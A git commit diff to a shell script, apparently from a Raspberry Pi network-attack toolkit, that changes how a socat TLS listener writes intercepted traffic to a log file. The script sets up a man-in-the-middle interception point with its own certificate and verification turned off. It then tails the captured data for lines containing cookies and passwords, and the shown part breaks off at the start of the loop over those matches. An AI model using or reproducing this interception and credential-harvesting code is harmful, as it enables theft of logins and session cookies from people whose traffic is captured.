fcd68d9cca45408f557fdb9f7bd2f713cc2b6488
s0i37 <s0i37@work>
2021-03-30 22:20:59 +0500

    fixed socat syntax

--- on_network/sslsplit.sh
+++ on_network/sslsplit.sh
@@ -10,7 +10,7 @@ HOME='/home/pi/'
 #[[ $(pgrep /usr/bin/sslsplit) = '' ]] && {
 [[ $(pgrep /usr/bin/socat) = '' ]] && {
 	#screen -dmS sslsplit sslsplit -k $HOME/key.pem -c $HOME/cert.pem -l $HOME/con.log -L $HOME/data.log -P autossl 0.0.0.0 1080
-	screen -dmS sslsplit socat -v openssl-listen:1080,fork,cert=$HOME/cert_key.pem,cafile=$HOME/cert.pem,verify=0 - 2> /dev/null >> $HOME/data.log < <(echo -ne "HTTP/1.1 200\r\n")
+	screen -dmS sslsplit socat -v openssl-listen:1080,fork,cert=$HOME/cert_key.pem,cafile=$HOME/cert.pem,verify=0 open:$HOME/data.log,creat,append 2> /dev/null
 }
 
 tail -f $HOME/data.log | grep -ai -e cookie -e passw | while read match
